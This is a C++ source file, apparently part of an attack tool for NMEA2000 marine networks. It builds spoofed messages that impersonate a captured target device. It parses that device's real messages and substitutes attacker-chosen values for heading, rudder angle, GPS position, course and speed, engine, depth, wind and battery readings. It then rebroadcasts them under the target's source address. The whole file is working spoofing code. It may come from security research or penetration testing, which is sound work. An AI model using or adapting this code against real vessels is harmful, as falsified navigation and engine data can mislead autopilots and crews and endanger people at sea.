/**
 * @file Attack_Spoof.cpp
 * @brief Message spoofing implementation for Attack_Controller
 *
 * This file implements the message building logic for spoofed NMEA2000 PGN
 * messages. It handles parsing original messages, modifying specified fields,
 * and reconstructing valid messages with the target device's source address.
 */

#include "Attack_Controller.h"
#include "constants.h"

/**
 * @brief Builds a spoofed NMEA2000 message with modified field values
 *
 * This function creates a valid NMEA2000 message that appears to come from
 * the target device but contains attacker-controlled field values. It uses
 * the original message data as a template to maintain valid message structure.
 *
 * The function:
 * 1. Retrieves the original PGN data captured from the target device
 * 2. Parses the original message using NMEA2000 library functions
 * 3. Applies modifications to the selected field and any locked fields
 * 4. Reconstructs the message using library SetN2k* functions
 * 5. Sets the source address to impersonate the target device
 *
 * @param N2kMsg Reference to the message structure to populate
 * @param pgn The PGN number to spoof
 * @param fieldIndex The index of the field being actively controlled
 * @param value The value to set for the active field
 *
 * Supported PGNs include:
 * - Navigation: 127250 (Heading), 129025 (Position), 129026 (COG/SOG)
 * - Steering: 127245 (Rudder), 127251 (Rate of Turn), 127257 (Attitude)
 * - Engine: 127488 (Rapid), 127489 (Dynamic), 127493 (Transmission)
 * - Environmental: 130306 (Wind), 130310-130316 (Temp/Humidity/Pressure)
 * - Systems: 127505 (Fluid), 127506-127508 (Battery/Charger)
 * - And more...
 */
void Attack_Controller::buildSpoofedMessage(tN2kMsg &N2kMsg, uint32_t pgn,
                                            int fieldIndex, float value) {
    // Check if we have raw data to use as template
    PGNData* pgnData = monitor->getPGNData(impTargetAddress, pgn);
    if (pgnData == nullptr) {
        return;
    }

    int numFields = pgnData->fields.size();

    // Helper lambda to get field value (locked, current, or from original parse)
    auto getFieldValue = [&](int idx, float originalValue) -> float {
        if (idx == fieldIndex) return value;  // Currently selected field
        if (idx < MAX_IMP_FIELDS && impFieldLocked[idx]) return impFieldLockedValues[idx];
        return originalValue;  // Use original parsed value
    };

    // Create a temporary message from raw data for parsing
    tN2kMsg originalMsg;
    originalMsg.SetPGN(pgn);
    originalMsg.DataLen = pgnData->dataLen;
    memcpy(originalMsg.Data, pgnData->rawData, pgnData->dataLen);

    // Parse original, modify fields, and reconstruct using library functions
    switch (pgn) {
        case 127245: {  // Rudder
            double RudderPosition;
            unsigned char Instance;
            tN2kRudderDirectionOrder RudderDirectionOrder;
            double AngleOrder;
            if (ParseN2kRudder(originalMsg, RudderPosition, Instance, RudderDirectionOrder, AngleOrder)) {
                RudderPosition = DegToRad(getFieldValue(0, RadToDeg(RudderPosition)));
                SetN2kRudder(N2kMsg, RudderPosition, Instance, RudderDirectionOrder, AngleOrder);
            }
            break;
        }

        case 127250: {  // Vessel Heading
            unsigned char SID;
            double Heading, Deviation, Variation;
            tN2kHeadingReference ref;
            if (ParseN2kHeading(originalMsg, SID, Heading, Deviation, Variation, ref)) {
                Heading = DegToRad(getFieldValue(0, RadToDeg(Heading)));
                if (!N2kIsNA(Deviation)) Deviation = DegToRad(getFieldValue(1, RadToDeg(Deviation)));
                if (!N2kIsNA(Variation)) Variation = DegToRad(getFieldValue(2, RadToDeg(Variation)));
                SetN2kPGN127250(N2kMsg, SID, Heading, Deviation, Variation, ref);
            }
            break;
        }

        case 127251: {  // Rate of Turn
            unsigned char SID;
            double RateOfTurn;
            if (ParseN2kRateOfTurn(originalMsg, SID, RateOfTurn)) {
                // Value is in deg/min, library uses rad/s
                double degPerMin = RadToDeg(RateOfTurn) * 60.0;
                degPerMin = getFieldValue(0, degPerMin);
                RateOfTurn = DegToRad(degPerMin / 60.0);
                SetN2kRateOfTurn(N2kMsg, SID, RateOfTurn);
            }
            break;
        }

        case 127252: {  // Heave
            unsigned char SID;
            double Heave, Delay;
            tN2kDelaySource DelaySource;
            if (ParseN2kHeave(originalMsg, SID, Heave, Delay, DelaySource)) {
                Heave = getFieldValue(0, Heave);
                if (!N2kIsNA(Delay)) Delay = getFieldValue(1, Delay);
                SetN2kHeave(N2kMsg, SID, Heave, Delay, DelaySource);
            }
            break;
        }

        case 127257: {  // Attitude
            unsigned char SID;
            double Yaw, Pitch, Roll;
            if (ParseN2kAttitude(originalMsg, SID, Yaw, Pitch, Roll)) {
                if (!N2kIsNA(Yaw)) Yaw = DegToRad(getFieldValue(0, RadToDeg(Yaw)));
                if (!N2kIsNA(Pitch)) Pitch = DegToRad(getFieldValue(1, RadToDeg(Pitch)));
                if (!N2kIsNA(Roll)) Roll = DegToRad(getFieldValue(2, RadToDeg(Roll)));
                SetN2kAttitude(N2kMsg, SID, Yaw, Pitch, Roll);
            }
            break;
        }

        case 127258: {  // Magnetic Variation
            unsigned char SID;
            tN2kMagneticVariation Source;
            uint16_t DaysSince1970;
            double Variation;
            if (ParseN2kMagneticVariation(originalMsg, SID, Source, DaysSince1970, Variation)) {
                Variation = DegToRad(getFieldValue(0, RadToDeg(Variation)));
                SetN2kMagneticVariation(N2kMsg, SID, Source, DaysSince1970, Variation);
            }
            break;
        }

        case 127488: {  // Engine Parameters, Rapid Update
            unsigned char EngineInstance;
            double EngineSpeed, EngineBoostPressure;
            int8_t EngineTiltTrim;
            if (ParseN2kEngineParamRapid(originalMsg, EngineInstance, EngineSpeed, EngineBoostPressure, EngineTiltTrim)) {
                EngineSpeed = getFieldValue(0, EngineSpeed);
                if (!N2kIsNA(EngineBoostPressure)) EngineBoostPressure = getFieldValue(1, EngineBoostPressure / 100) * 100;
                SetN2kEngineParamRapid(N2kMsg, EngineInstance, EngineSpeed, EngineBoostPressure, EngineTiltTrim);
            }
            break;
        }

        case 127489: {  // Engine Parameters, Dynamic
            unsigned char EngineInstance;
            double EngineOilPress, EngineOilTemp, EngineCoolantTemp, AlternatorVoltage;
            double FuelRate, EngineHours, EngineCoolantPress, EngineFuelPress;
            int8_t EngineLoad, EngineTorque;
            tN2kEngineDiscreteStatus1 Status1;
            tN2kEngineDiscreteStatus2 Status2;
            if (ParseN2kEngineDynamicParam(originalMsg, EngineInstance, EngineOilPress, EngineOilTemp,
                                          EngineCoolantTemp, AlternatorVoltage, FuelRate, EngineHours,
                                          EngineCoolantPress, EngineFuelPress, EngineLoad, EngineTorque,
                                          Status1, Status2)) {
                if (!N2kIsNA(EngineOilPress)) EngineOilPress = getFieldValue(0, EngineOilPress / 1000) * 1000;
                if (!N2kIsNA(EngineOilTemp)) EngineOilTemp = CToKelvin(getFieldValue(1, KelvinToC(EngineOilTemp)));
                if (!N2kIsNA(EngineCoolantTemp)) EngineCoolantTemp = CToKelvin(getFieldValue(2, KelvinToC(EngineCoolantTemp)));
                if (!N2kIsNA(AlternatorVoltage)) AlternatorVoltage = getFieldValue(3, AlternatorVoltage);
                if (!N2kIsNA(FuelRate)) FuelRate = getFieldValue(4, FuelRate * 3600) / 3600;
                if (!N2kIsNA(EngineHours)) EngineHours = getFieldValue(5, EngineHours / 3600) * 3600;
                if (EngineLoad != N2kInt8NA) EngineLoad = (int8_t)getFieldValue(6, EngineLoad);
                SetN2kEngineDynamicParam(N2kMsg, EngineInstance, EngineOilPress, EngineOilTemp,
                                        EngineCoolantTemp, AlternatorVoltage, FuelRate, EngineHours,
                                        EngineCoolantPress, EngineFuelPress, EngineLoad, EngineTorque,
                                        tN2kEngineDiscreteStatus1(0), tN2kEngineDiscreteStatus2(0));
            }
            break;
        }

        case 127493: {  // Transmission Parameters
            unsigned char EngineInstance;
            tN2kTransmissionGear TransmissionGear;
            double OilPressure, OilTemperature;
            unsigned char DiscreteStatus1;
            if (ParseN2kTransmissionParameters(originalMsg, EngineInstance, TransmissionGear,
                                              OilPressure, OilTemperature, DiscreteStatus1)) {
                TransmissionGear = (tN2kTransmissionGear)(int)getFieldValue(0, (int)TransmissionGear);
                if (!N2kIsNA(OilPressure)) OilPressure = getFieldValue(1, OilPressure / 1000) * 1000;
                if (!N2kIsNA(OilTemperature)) OilTemperature = CToKelvin(getFieldValue(2, KelvinToC(OilTemperature)));
                SetN2kTransmissionParameters(N2kMsg, EngineInstance, TransmissionGear, OilPressure, OilTemperature, DiscreteStatus1);
            }
            break;
        }

        case 127497: {  // Trip Fuel Parameters
            unsigned char EngineInstance;
            double TripFuelUsed, FuelRateAverage, FuelRateEconomy, InstantaneousFuelEconomy;
            if (ParseN2kEngineTripParameters(originalMsg, EngineInstance, TripFuelUsed, FuelRateAverage, FuelRateEconomy, InstantaneousFuelEconomy)) {
                if (!N2kIsNA(TripFuelUsed)) TripFuelUsed = getFieldValue(0, TripFuelUsed);
                if (!N2kIsNA(FuelRateAverage)) FuelRateAverage = getFieldValue(1, FuelRateAverage * 3600) / 3600;
                SetN2kEngineTripParameters(N2kMsg, EngineInstance, TripFuelUsed, FuelRateAverage, FuelRateEconomy, InstantaneousFuelEconomy);
            }
            break;
        }

        case 127505: {  // Fluid Level
            unsigned char Instance;
            tN2kFluidType FluidType;
            double Level, Capacity;
            if (ParseN2kFluidLevel(originalMsg, Instance, FluidType, Level, Capacity)) {
                Level = getFieldValue(0, Level);
                SetN2kFluidLevel(N2kMsg, Instance, FluidType, Level, Capacity);
            }
            break;
        }

        case 127506: {  // DC Detailed Status
            unsigned char SID, DCInstance;
            tN2kDCType DCType;
            uint8_t StateOfCharge, StateOfHealth;
            double TimeRemaining, RippleVoltage, Capacity;
            if (ParseN2kDCStatus(originalMsg, SID, DCInstance, DCType, StateOfCharge, StateOfHealth, TimeRemaining, RippleVoltage, Capacity)) {
                if (StateOfCharge <= 100) StateOfCharge = (uint8_t)getFieldValue(0, StateOfCharge);
                if (StateOfHealth <= 100) StateOfHealth = (uint8_t)getFieldValue(1, StateOfHealth);
                if (!N2kIsNA(Capacity)) Capacity = getFieldValue(2, Capacity);
                SetN2kDCStatus(N2kMsg, SID, DCInstance, DCType, StateOfCharge, StateOfHealth, TimeRemaining, RippleVoltage, Capacity);
            }
            break;
        }

        case 127507: {  // Charger Status
            unsigned char Instance, BatteryInstance;
            tN2kChargeState ChargeState;
            tN2kChargerMode ChargerMode;
            tN2kOnOff Enabled;
            tN2kOnOff EqualizationPending;
            double EqualizationTimeRemaining;
            if (ParseN2kChargerStatus(originalMsg, Instance, BatteryInstance, ChargeState, ChargerMode, Enabled, EqualizationPending, EqualizationTimeRemaining)) {
                ChargeState = (tN2kChargeState)(int)getFieldValue(0, (int)ChargeState);
                Enabled = (getFieldValue(1, Enabled == N2kOnOff_On ? 1 : 0) > 0.5) ? N2kOnOff_On : N2kOnOff_Off;
                SetN2kChargerStatus(N2kMsg, Instance, BatteryInstance, ChargeState, ChargerMode, Enabled, EqualizationPending, EqualizationTimeRemaining);
            }
            break;
        }

        case 127508: {  // Battery Status
            unsigned char BatteryInstance;
            double BatteryVoltage, BatteryCurrent, BatteryTemperature;
            unsigned char SID;
            if (ParseN2kDCBatStatus(originalMsg, BatteryInstance, BatteryVoltage, BatteryCurrent, BatteryTemperature, SID)) {
                if (!N2kIsNA(BatteryVoltage)) BatteryVoltage = getFieldValue(0, BatteryVoltage);
                if (!N2kIsNA(BatteryCurrent)) BatteryCurrent = getFieldValue(1, BatteryCurrent);
                SetN2kDCBatStatus(N2kMsg, BatteryInstance, BatteryVoltage, BatteryCurrent, BatteryTemperature, SID);
            }
            break;
        }

        case 128000: {  // Leeway
            unsigned char SID;
            double Leeway;
            if (ParseN2kLeeway(originalMsg, SID, Leeway)) {
                Leeway = DegToRad(getFieldValue(0, RadToDeg(Leeway)));
                SetN2kLeeway(N2kMsg, SID, Leeway);
            }
            break;
        }

        case 128259: {  // Speed, Water Referenced
            unsigned char SID;
            double WaterReferenced, GroundReferenced;
            tN2kSpeedWaterReferenceType SWRT;
            if (ParseN2kBoatSpeed(originalMsg, SID, WaterReferenced, GroundReferenced, SWRT)) {
                if (!N2kIsNA(WaterReferenced)) WaterReferenced = getFieldValue(0, WaterReferenced);
                if (!N2kIsNA(GroundReferenced)) GroundReferenced = getFieldValue(1, GroundReferenced);
                SetN2kBoatSpeed(N2kMsg, SID, WaterReferenced, GroundReferenced, SWRT);
            }
            break;
        }

        case 128267: {  // Water Depth
            unsigned char SID;
            double DepthBelowTransducer, Offset, Range;
            if (ParseN2kWaterDepth(originalMsg, SID, DepthBelowTransducer, Offset, Range)) {
                DepthBelowTransducer = getFieldValue(0, DepthBelowTransducer);
                if (!N2kIsNA(Offset)) Offset = getFieldValue(1, Offset);
                SetN2kWaterDepth(N2kMsg, SID, DepthBelowTransducer, Offset);
            }
            break;
        }

        case 129025: {  // Position, Rapid Update
            double Latitude, Longitude;
            if (ParseN2kPositionRapid(originalMsg, Latitude, Longitude)) {
                Latitude = getFieldValue(0, Latitude);
                Longitude = getFieldValue(1, Longitude);
                SetN2kLatLonRapid(N2kMsg, Latitude, Longitude);
            }
            break;
        }

        case 129026: {  // COG & SOG, Rapid Update
            unsigned char SID;
            tN2kHeadingReference ref;
            double COG, SOG;
            if (ParseN2kCOGSOGRapid(originalMsg, SID, ref, COG, SOG)) {
                if (!N2kIsNA(COG)) COG = DegToRad(getFieldValue(0, RadToDeg(COG)));
                if (!N2kIsNA(SOG)) SOG = getFieldValue(1, SOG);
                SetN2kCOGSOGRapid(N2kMsg, SID, ref, COG, SOG);
            }
            break;
        }

        case 130306: {  // Wind Data
            unsigned char SID;
            double WindSpeed, WindAngle;
            tN2kWindReference WindReference;
            if (ParseN2kWindSpeed(originalMsg, SID, WindSpeed, WindAngle, WindReference)) {
                WindSpeed = getFieldValue(0, WindSpeed);
                WindAngle = DegToRad(getFieldValue(1, RadToDeg(WindAngle)));
                SetN2kWindSpeed(N2kMsg, SID, WindSpeed, WindAngle, WindReference);
            }
            break;
        }

        case 130310: {  // Environmental Parameters (Outside)
            unsigned char SID;
            double WaterTemperature, OutsideAmbientAirTemperature, AtmosphericPressure;
            if (ParseN2kOutsideEnvironmentalParameters(originalMsg, SID, WaterTemperature,
                                                       OutsideAmbientAirTemperature, AtmosphericPressure)) {
                if (!N2kIsNA(WaterTemperature)) WaterTemperature = getFieldValue(0, WaterTemperature);
                if (!N2kIsNA(OutsideAmbientAirTemperature)) OutsideAmbientAirTemperature = getFieldValue(1, OutsideAmbientAirTemperature);
                if (!N2kIsNA(AtmosphericPressure)) AtmosphericPressure = getFieldValue(2, AtmosphericPressure);
                SetN2kOutsideEnvironmentalParameters(N2kMsg, SID, WaterTemperature, OutsideAmbientAirTemperature, AtmosphericPressure);
            }
            break;
        }

        case 130311: {  // Environmental Parameters
            unsigned char SID;
            tN2kTempSource TempSource;
            double Temperature;
            tN2kHumiditySource HumiditySource;
            double Humidity, AtmosphericPressure;
            if (ParseN2kEnvironmentalParameters(originalMsg, SID, TempSource, Temperature,
                                               HumiditySource, Humidity, AtmosphericPressure)) {
                if (!N2kIsNA(Temperature)) Temperature = getFieldValue(0, Temperature);
                if (!N2kIsNA(Humidity)) Humidity = getFieldValue(1, Humidity);
                if (!N2kIsNA(AtmosphericPressure)) AtmosphericPressure = getFieldValue(2, AtmosphericPressure);
                SetN2kEnvironmentalParameters(N2kMsg, SID, TempSource, Temperature, HumiditySource, Humidity, AtmosphericPressure);
            }
            break;
        }

        case 130312: {  // Temperature
            unsigned char SID, TempInstance;
            tN2kTempSource TempSource;
            double ActualTemperature, SetTemperature;
            if (ParseN2kTemperature(originalMsg, SID, TempInstance, TempSource, ActualTemperature, SetTemperature)) {
                if (!N2kIsNA(ActualTemperature)) ActualTemperature = getFieldValue(0, ActualTemperature);
                if (!N2kIsNA(SetTemperature)) SetTemperature = getFieldValue(1, SetTemperature);
                SetN2kTemperature(N2kMsg, SID, TempInstance, TempSource, ActualTemperature, SetTemperature);
            }
            break;
        }

        case 130313: {  // Humidity
            unsigned char SID, HumidityInstance;
            tN2kHumiditySource HumiditySource;
            double ActualHumidity, SetHumidity;
            if (ParseN2kHumidity(originalMsg, SID, HumidityInstance, HumiditySource, ActualHumidity, SetHumidity)) {
                if (!N2kIsNA(ActualHumidity)) ActualHumidity = getFieldValue(0, ActualHumidity);
                if (!N2kIsNA(SetHumidity)) SetHumidity = getFieldValue(1, SetHumidity);
                SetN2kHumidity(N2kMsg, SID, HumidityInstance, HumiditySource, ActualHumidity, SetHumidity);
            }
            break;
        }

        case 130314: {  // Pressure
            unsigned char SID, PressureInstance;
            tN2kPressureSource PressureSource;
            double Pressure;
            if (ParseN2kPressure(originalMsg, SID, PressureInstance, PressureSource, Pressure)) {
                Pressure = getFieldValue(0, Pressure);
                SetN2kPressure(N2kMsg, SID, PressureInstance, PressureSource, Pressure);
            }
            break;
        }

        case 130316: {  // Temperature Extended Range
            unsigned char SID, TempInstance;
            tN2kTempSource TempSource;
            double ActualTemperature, SetTemperature;
            if (ParseN2kTemperatureExt(originalMsg, SID, TempInstance, TempSource, ActualTemperature, SetTemperature)) {
                if (!N2kIsNA(ActualTemperature)) ActualTemperature = getFieldValue(0, ActualTemperature);
                if (!N2kIsNA(SetTemperature)) SetTemperature = getFieldValue(1, SetTemperature);
                SetN2kTemperatureExt(N2kMsg, SID, TempInstance, TempSource, ActualTemperature, SetTemperature);
            }
            break;
        }

        case 130576: {  // Trim Tab Status
            int8_t PortTrimTab, StbdTrimTab;
            if (ParseN2kTrimTab(originalMsg, PortTrimTab, StbdTrimTab)) {
                if (PortTrimTab != N2kInt8NA) PortTrimTab = (int8_t)getFieldValue(0, PortTrimTab);
                if (StbdTrimTab != N2kInt8NA) StbdTrimTab = (int8_t)getFieldValue(1, StbdTrimTab);
                SetN2kTrimTab(N2kMsg, PortTrimTab, StbdTrimTab);
            }
            break;
        }

        case 130577: {  // Direction Data
            tN2kDataMode DataMode;
            tN2kHeadingReference CogReference;
            unsigned char SID;
            double COG, SOG, Heading, SpeedThroughWater, Set, Drift;
            if (ParseN2kDirectionData(originalMsg, DataMode, CogReference, SID, COG, SOG, Heading, SpeedThroughWater, Set, Drift)) {
                if (!N2kIsNA(COG)) COG = DegToRad(getFieldValue(0, RadToDeg(COG)));
                if (!N2kIsNA(SOG)) SOG = getFieldValue(1, SOG);
                if (!N2kIsNA(Heading)) Heading = DegToRad(getFieldValue(2, RadToDeg(Heading)));
                if (!N2kIsNA(Set)) Set = DegToRad(getFieldValue(3, RadToDeg(Set)));
                if (!N2kIsNA(Drift)) Drift = getFieldValue(4, Drift);
                SetN2kDirectionData(N2kMsg, DataMode, CogReference, SID, COG, SOG, Heading, SpeedThroughWater, Set, Drift);
            }
            break;
        }

        default: {
            // For unsupported PGNs, just copy the raw data unchanged
            N2kMsg.SetPGN(pgn);
            N2kMsg.Priority = 2;
            N2kMsg.DataLen = pgnData->dataLen;
            memcpy(N2kMsg.Data, pgnData->rawData, pgnData->dataLen);
            break;
        }
    }

    // After reconstruction, set the spoofed source address
    N2kMsg.Source = impTargetAddress;
    N2kMsg.Destination = 255;  // Broadcast
}
